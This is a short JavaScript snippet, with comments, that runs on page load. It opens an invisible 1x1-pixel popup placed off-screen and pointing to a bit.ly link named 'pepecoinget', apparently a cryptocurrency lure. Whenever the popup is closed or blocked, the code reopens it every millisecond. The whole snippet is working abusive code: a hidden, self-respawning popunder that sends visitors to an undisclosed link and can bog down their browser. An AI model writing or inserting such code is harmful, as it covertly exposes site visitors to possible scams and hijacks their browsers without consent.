// First function
function openFirstPopupInBackground() {
    // Open a popup window with specified URL and attributes
    var popup = window.open('https://bit.ly/pepecoinget', '_blank', 'left=-10000, top=-10000, width=1, height=1');

    // Function to attempt opening the popup recursively
    function attemptOpen() {
        // Check if the popup is closed or null
        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
            // Retry opening the popup after a short delay
            setTimeout(function() {
                // Reopen the popup
                popup = window.open('https://bit.ly/pepecoinget', '_blank', 'left=-10000, top=-10000, width=1, height=1');
                // Retry opening recursively
                attemptOpen();
            }, 1);
        }
    }

    // Initial attempt to open the popup
    attemptOpen();
}

// Add an event listener to trigger the function when the window loads
window.addEventListener('load', openFirstPopupInBackground);
